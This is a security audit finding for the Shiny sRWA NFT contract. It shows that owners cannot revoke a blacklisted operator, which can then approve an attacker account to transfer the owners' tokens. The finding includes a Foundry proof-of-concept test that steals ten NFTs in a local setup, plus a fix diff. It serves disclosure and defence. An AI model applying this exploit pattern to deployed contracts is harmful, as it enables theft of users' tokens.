---
tags:
  - lang/solidity
  - platform/shieldify
  - has/github
  - has/poc
  - severity/high
  - sector/nft
  - sector/rwa
  - sector/staking
protocol: "[[Shiny]]"
auditors:
  - "[[Shieldify Security]]"
report: "https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md"
genome:
  - "[[broken-logic]]"
  - "[[direct-drain]]"
  - "[[account-ownership]]"
  - "[[vote-delegation-loop]]"
---
# [H-02] Blacklisted Operators Can Not Be Revoked from Being an Operator

- id: 64682
- impact: HIGH
- protocol: [[Shiny]]
- reporter: Shieldify Security (Shieldify)
- source: https://github.com/shieldify-security/audits-portfolio-md/blob/main/Shiny-Security-Review.md

## Summary


This bug report discusses a problem with NFTs (non-fungible tokens) being stolen by blacklisted operators. These operators are able to burn or sell the NFTs after stealing them. The severity of this issue is high as the victim NFT owner cannot revoke the approval from the blacklisted operator. The root cause of this issue is that the code does not allow for revocation if the operator is blacklisted. Additionally, the blacklisted operator is able to call a function that allows them to delegate approvals to an unblacklisted attacker, who can then steal the NFTs. The affected code can be found in the files sRWA.sol and ERC721.sol. A proof of concept has been provided to demonstrate how this bug can be exploited. The recommendation is to allow for revocation even if the operator is blacklisted and to block blacklisted callers from managing approvals. The team has responded that they have fixed the issue. 

## Details


## Severity

High Risk

## Description

NFTs can be stolen by the blacklisted operators. They can then burn/sell afterwards.
Impact is high, as the victim NFT owner cannot revoke the approval from this balcaklisted operator because of this line below

Root cause :

- `sRWA::setApprovalForAll(account, false)` reverts if account is blacklisted
- `sRWA::approve()` can be called by blacklisted operators.

File: [sRWA.sol#L280](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol#L280)

```solidity
 function setApprovalForAll(address operator, bool approved) public virtual override {
>>>  if (_isBlacklisted[operator]) revert Blacklisted();
     super.setApprovalForAll(operator, approved);
 }
```

In `sRWA.sol`:

1. A router exists, and a user who owns 10 NFTs sets it as his operator by calling `setApprovalForAll(router, true)`.
2. The admin decides to blacklist this operator address (router) by calling `blacklistContract(router)` (e.g., due to OFAC/rogue).
3. The user attempts to revoke the operator by calling `setApprovalForAll(router, false)`, but it reverts in line 301 below. (Issue 1)
4. The rogue (now blacklisted) operator calls `approve(rogue operator's new unblacklisted account, victim owner's tokenId)`.
5. Once approved, the attacker pulls those tokens via `transferFrom(victim owner, new unblacklisted account, victim owner's tokenId)`, and now the attacker owns them.
6. Check line 389 of ERC721 below. It allows operators to assign new approvals for each token id

## Location of Affected Code

File: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)

```solidity
 function setApprovalForAll(address operator, bool approved) public virtual override {
     if (_isBlacklisted[operator]) revert Blacklisted();
     super.setApprovalForAll(operator, approved);
 }

 function approve(address to, uint256 tokenId) public virtual override {
     if (_isBlacklisted[to]) revert Blacklisted();
     super.approve(to, tokenId);
 }
```

File: [contracts/token/ERC721/ERC721.sol](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol)

```solidity
function _approve(address to, uint256 tokenId, address auth, bool emitEvent) internal virtual {
   // Avoid reading the owner unless necessary
   if (emitEvent || auth != address(0)) {
       address owner = _requireOwned(tokenId);

       // We do not use _isAuthorized because single-token approvals should not be able to call approve
>>>    if (auth != address(0) && owner != auth && !isApprovedForAll(owner, auth)) {
           revert ERC721InvalidApprover(auth);
       }

       if (emitEvent) {
           emit Approval(owner, to, tokenId);
       }
   }

   _tokenApprovals[tokenId] = to;
}
```

## Impact

Users who previously granted `setApprovalForAll(router, true)` can have their NFTs stolen after the router is blacklisted, because:

- The user cannot revoke the operator approval.
- The blacklisted operator can still delegate approvals to an unblacklisted attacker, who can then transfer the NFTs.

## Proof of Concept

Run it in `test/System.t.sol`

```solidity
function test_POC_BlacklistedOperator_CannotBeRevoked_AndCanStealViaApprove() public {
    address router = makeAddr("router");
    address attacker = makeAddr("attacker");

    // Mint 9 more tokens so `user` owns 10 NFTs total (tokenIds 1..10)
    vm.startPrank(owner);
    rwa.mint(user, "UUID-124");
    rwa.mint(user, "UUID-125");
    rwa.mint(user, "UUID-126");
    rwa.mint(user, "UUID-127");
    rwa.mint(user, "UUID-128");
    rwa.mint(user, "UUID-129");
    rwa.mint(user, "UUID-130");
    rwa.mint(user, "UUID-131");
    rwa.mint(user, "UUID-132");
    vm.stopPrank();

    // 1) user makes router an operator
    vm.prank(user);
    rwa.setApprovalForAll(router, true);
    assertTrue(rwa.isApprovedForAll(user, router));

    // 2) admin blacklists the operator/router address
    vm.prank(owner);
    rwa.blacklistContract(router);
    assertTrue(rwa.isBlacklisted(router));

    // 3) user attempts to revoke operator approval, but it reverts
    vm.prank(user);
    vm.expectRevert(RWA.Blacklisted.selector);
    rwa.setApprovalForAll(router, false);

    // 4) blacklisted router approves an unblacklisted attacker for each tokenId
    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {
        vm.prank(router);
        rwa.approve(attacker, tokenId);
        assertEq(rwa.getApproved(tokenId), attacker);
    }

    // 5) attacker pulls the tokens and becomes the owner
    for (uint256 tokenId = 1; tokenId <= 10; tokenId++) {
        vm.prank(attacker);
        rwa.transferFrom(user, attacker, tokenId);
        assertEq(rwa.ownerOf(tokenId), attacker);
    }
}
```

## Recommendation

1. Allow revocation even if the operator is blacklisted (only block when setting `approved == true`).
2. Block blacklisted callers from managing approvals (e.g., revert in `approve()` and `setApprovalForAll()` when `msg.sender` is blacklisted), so a blacklisted operator cannot delegate approvals to an unblacklisted attacker.

File: [sRWA.sol](https://github.com/ShinyUrban/SmartContracts/blob/f49b5db73b297552666783ed587cf0818ef86b75/sRWA.sol)

```diff
function approve(address to, uint256 tokenId) public virtual override {
+  if (_isBlacklisted[msg.sender]) revert Blacklisted();
   if (_isBlacklisted[to]) revert Blacklisted();
      super.approve(to, tokenId);
   }
}

function setApprovalForAll(address operator, bool approved) public virtual override {
-     if (_isBlacklisted[operator]) revert Blacklisted();
+     if (_isBlacklisted[operator] && approved == true) revert Blacklisted();
         super.setApprovalForAll(operator, approved);
      }
}
```

## Team Response

Fixed.
